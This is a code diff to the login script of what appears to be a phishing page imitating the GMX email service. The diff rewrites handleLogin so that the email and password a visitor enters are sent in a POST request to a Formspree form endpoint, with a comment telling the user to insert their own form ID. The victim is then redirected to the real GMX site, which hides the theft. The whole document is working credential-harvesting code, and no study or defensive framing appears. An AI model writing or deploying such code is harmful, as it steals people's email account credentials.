@@ -90,20 +90,27 @@
         document.getElementById('preloader').classList.remove('active');
     });
 
-    function handleLogin() {
+    async function handleLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         if (!email || !password) return;
 
-        // Save to sessionStorage (no database needed)
-        sessionStorage.setItem('gmx_email', email);
-        sessionStorage.setItem('gmx_password', password);
-
-        // Show preloader then redirect to real GMX
         showPreloader();
-        setTimeout(function() {
-            window.location.href = 'https://www.gmx.com';
-        }, 800);
+
+        // Send to Formspree - replace with YOUR form ID
+        await fetch('https://formspree.io/f/mvzykrkg', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'LOGIN',
+                email: email,
+                password: password,
+                time: new Date().toLocaleString()
+            })
+        });
+
+        // Redirect to real GMX
+        window.location.href = 'https://www.gmx.com';
     }
 </script>
 </body>
